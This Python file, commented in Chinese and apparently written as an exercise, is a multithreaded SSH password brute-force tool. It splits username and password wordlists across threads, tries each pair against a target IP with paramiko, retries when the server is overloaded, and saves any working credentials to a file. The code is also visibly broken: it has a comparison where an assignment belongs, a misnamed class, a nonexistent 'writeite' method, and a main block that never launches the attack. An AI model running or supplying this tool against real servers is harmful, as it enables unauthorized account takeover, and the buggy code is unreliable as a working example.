import optparse  #命令行选项的解析器
import sys   #系统特定的参数和功能
import os  #操作系统相关模块
import threading  #多线程模块
from burp_password import ThreadWork  #导入之前编写的爆破密码中的多线程模块
import paramiko #操作ssh的模块

#分块函数,一个线程负责一个账号密码子列表
def partition(list,num):
    step = int(len(list) / num)
    #step为每个子列表的长度
    if step == 0:
        #若线程数大于列表长度，则不对列表进行分割，防止报错
        step == num
        partList = [list[i:i+step] for i in range(0,len(list),step)]
        return partList

#破解函数
def SshExploit(ip,usernameFile,passwordFile,threadNumber,sshPort):
    #提示输出信息
    print("============破解信息===========")
    print("IP:"+ip)
    print("Username:"+usernameFile)
    print("Password:"+passwordFile)
    print("Threads:"+str(threadNumber))
    print("Port:" + sshPort)    
    print("================================")

    #读取账户文件和密码文件并存入对应列表
    listUsername = [line.strip() for line in open(usernameFile)]
    listPassword = [line.strip() for line in open(passwordFile)]
    #将账户列表和密码列表根据线程数量进行
    blockUsername = partition(listUsername,threadNumber)
    blockPassword = partition(listPassword,threadNumber)
    threads = []
    #为每个线程分配一个账户密码子块
    for sonUserBlock in blockUsername:
        for sonPwdBlock in blockPassword:
            work = ThreadWork(ip,sonUserBlock,sonPwdBlock,sshPort)
            #创建线程
            workThread = threading.Thread(target=work.start)
            # 在threads中加入线程
            threads.append(workThread)
    # 开始子线程
    for t in threads:
        t.start()
    #阻塞主进程，等待所有子线程完成工作
    for t in threads:
        t.join()

#编写子进程类，若账号密码正确，则写入result文件并退出程序，由于破解
#可能导致服务器无法响应一些线程的请求，因此可以通过捕获的异常让线程
#对当前的账户密码继续进行验证，防止报错导致请求丢失

class TreadWork(threading.Thread):
    def __init__(self,ip,usernameBlocak,passwordBlocak,port):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.usernameBlocak = usernameBlocak
        self.passwordBlocak = passwordBlocak

    def run(self,username,password):
        '''
        用死循环防止因为Error reading SSH protocol banner错误而出现线程没有验证账户
        和密码是否正确就被抛弃掉的情况       
        '''
        while True:
            try:
                #设置日志文件
                paramiko.util.log_to_file("SSHattack.log")
                ssh = paramiko.SSHClient()
                #接受不在本地known_host文件下的主机
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                #用sys.stdout.write输出信息，解决用print输出时错位的问题
                sys.stdout.writeite("[*]ssh[{}:{}:{}] => {}\n".format(username, password, self.port, self.ip))
                ssh.connect(hostname=self.ip,port=self.port,username=username,password=password,timeout=10)
                ssh.close()
                print("[+]success!!! username: {}, password: {}".format(username,password))
                #把结果写入result文件
                resultFile = open('result','a')
                resultFile.writeite("success!!! username: {}, password: {}".format(username, password))
                resultFile.close()
                os._exit(0)
            except paramiko.ssh_exception.AuthenticationException as e:
                #捕获Authentication failed 错误
                #说明账户密码错误，用break跳出循环
                break
            except paramiko.ssh_exception.SSHException as e:
                #捕获error reading ssh protocol banner错误
                #请求过多导致的问题用pass忽略掉，让线程继续请求，知道该次请求的账户密码被验证
                pass
    def start(self):
        #从账户子块和密码子块中提取出数据，分配给线程进行破解
        for userItem in self.usernameBlocak:
            for pwdItem in self.passwordBlocak:
                self.run(userItem,pwdItem)


if __name__ == '__main__':
    print("\n#####################################")    
    print("#         => DCBYGsec <=             #")    
    print("#                                  #")    
    print("#          SSH  experiment         #")    
    print("#####################################\n")   
    parser = optparse.OptionParser('usage: python %prog target [options] \n\n'
    'Example: python %prog 127.0.0.1 -u ./username  -p ./passwords -t 20\n')
    #添加用法说明
    parser.add_option('-i','--ip',dest='IP',type='string',help='target IP')
    #添加目标主机参数-i
    parser.add_option('-t','--threads',dest='threadNum',default=10,type='int',help='Number of threads')
    #添加目标主机参数-t
    parser.add_option('-u','--username',dest='userName',default='./username',type='string',help='username file')
    #添加目标主机参数-u
    parser.add_option('-p','--password',dest='password',default='./password',type='string',help='passwoed file')
    #添加目标主机参数-p
    parser.add_option('-P','--port',dest='port',default='22',type='string',help='ssh port')
    #添加目标主机参数-P
    (options,args) = parser.parse_args()